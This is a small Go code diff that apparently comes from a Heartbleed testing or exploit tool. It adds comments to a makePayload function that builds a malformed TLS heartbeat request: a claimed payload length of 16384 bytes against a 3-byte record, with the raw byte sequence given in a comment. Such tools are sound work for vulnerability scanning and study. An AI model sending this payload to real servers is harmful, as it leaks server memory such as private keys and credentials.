@@ -16,9 +16,9 @@ func makePayload(tlsVers int) []byte {
 	// heartbleed_payload="\x18\x03\x$TLSV\x00\x03\x01\x40\x00"
 	var b []byte
 
-	contentType := "18"
-	tlsVersion := fmt.Sprintf("0%x", tlsVers)
-	length := "0003" // 3 bytes
+	contentType := "18"                       // Heartbeat records
+	tlsVersion := fmt.Sprintf("0%x", tlsVers) // tls version
+	length := "0003"                          // 3 bytes
 	hbType := "01"
 	pLength := "4000" // 16384 bytes
 
